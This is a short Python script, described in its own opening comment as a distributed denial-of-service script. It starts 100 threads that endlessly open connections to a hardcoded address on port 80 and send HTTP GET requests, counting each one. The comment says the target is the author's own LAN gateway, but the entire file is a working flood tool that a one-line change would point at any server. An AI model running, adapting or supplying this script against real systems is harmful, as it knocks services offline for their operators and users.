#distributed denial-of-service script
import socket, threading

HOST = '192.168.1.1' #private/LAN IP addr of my default gateway (not publicaly routable)
PORT = 80 

requests = 0

def dos_attack(addr_tup):
    global requests
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect(addr_tup)
        sock.sendall(f'GET / {HOST} HTTP/1.1\r\n'.encode())
        sock.close()
        requests = requests + 1
        print('sent HTTP requests:', requests)
        
for _ in range(100):
    T = threading.Thread(target=dos_attack, args=((HOST, PORT),))
    T.start()

    
    